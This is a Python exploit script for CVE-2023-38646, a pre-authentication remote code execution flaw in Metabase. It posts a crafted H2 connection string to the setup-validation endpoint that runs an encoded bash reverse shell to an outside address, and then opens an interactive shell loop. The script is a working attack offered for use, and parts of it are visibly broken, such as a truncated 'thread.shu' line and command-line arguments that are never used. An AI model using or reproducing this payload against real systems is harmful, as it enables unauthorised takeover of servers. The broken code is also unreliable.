#!/usr/bin/env python3

import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
from socketserver import ThreadingMixIn
import threading
import sys
import argparse
from termcolor import colored
from cmd import Cmd

#https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
#https://gist.github.com/leonjza/adc69cadc3d8a5d4c068


class Termial(Cmd):
    prompt = "$> "
    def default(self,args):
        pass_command(args)


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        global success
        success = False
        if self.path == "/exploitable":
            print("[+] Metabase version seems exploitable")
            self.send_response(200)
            self.send_header()
            self.wfile.write(b"Sending me a shell soon ...")
            success = True

        else:
            print("[-] Service does not seem exploitable exiting ......")
            sys.exit(1)

class Server(HTTPServer):
    pass

def run():
    global httpserver
    httpserver = Server(("0.0.0.0", 8000), BaseHTTPRequestHandler)
    httpserver.serve_forever()

def exploit():
    print(colored("[*] Retriving setup token", "green"))
    setuptoken_request = requests.get("http://127.0.0.1/api/session/properties")
    print(colored("[*] Tesing if metabase is vulnerable", "green"))
    payload = {
        "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
        "details":
        {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules":
            {},
            "details":
            {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
                "advanced-options": False,
                "ssl": True
                },
                "name": "an-sec-research-team",
                "engine": "h2"
                }
                }
    timer = 0
    print(colored("[+] Starting http server on port 8000"))
    thread = threading.Thread(target=run, )
    thread.start()
    while timer != 120:
        requests.post("http://127.0.0.1/api/setup/validate", json=payload)
        if success == True :
            break
    thread.shu
    httpserver.shutdown()
    print(colored("[+] Exploiting the server"))
    payload2 = {
        "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
        "details":
        {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules":
            {},
            "details":
            {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
                "advanced-options": False,
                "ssl": True
                },
                "name": "an-sec-research-team",
                "engine": "h2"
                }
                }
    
    print(colored("[+] Starting a bind reverse shell on port 9001"))
    thread1 = threading.Thread(target=reverse_shell, )
    thread1.start()
    requests.post("http://127.0.0.1/api/setup/validate", json=payload2)
    
        

def pass_command(command):
    global s
    s.send(f"{command}\n")
    result = s.recv(1024).strip()
    if not len(result):
        print("[+] Empty response. Dead shell / exited?")
        s.close()
        sys.exit(1)
    print(result)

def reverse_shell():
    global s
    host = "127.0.0.1"
    port = 4444
    # try and connect to a bind shell
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        try:
            print("[+] Connected to bind shell!\n")
            terminal = Termial()
            terminal.cmdloop()
        except KeyboardInterrupt:
            print("\n[+] ^C Received, closing connection")
            s.close()
        except EOFError:
            print("\n[+] ^D Received, closing connection")
            s.close()
    except socket.error:
        print( "[+] Unable to connect to bind shell.")


if __name__ == "__main__":
    args = argparse.ArgumentParser(description="Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]")
    args.add_argument("-l", "--lhost", metavar="", help="Attacker's bind IP Address", type=str, required=True)
    args.add_argument("-p", "--port", metavar="", help="Attacker's bind port", type=int, required=True)
    args.add_argument("-P", "--sport", metavar="", help="HTTP Server bind port", type=int, required=True)
    args.add_argument("-r", "--rhost", metavar="", help="Victims's  IP Address", type=str, required=True)
    argument  = args.parse_args()
    exploit()
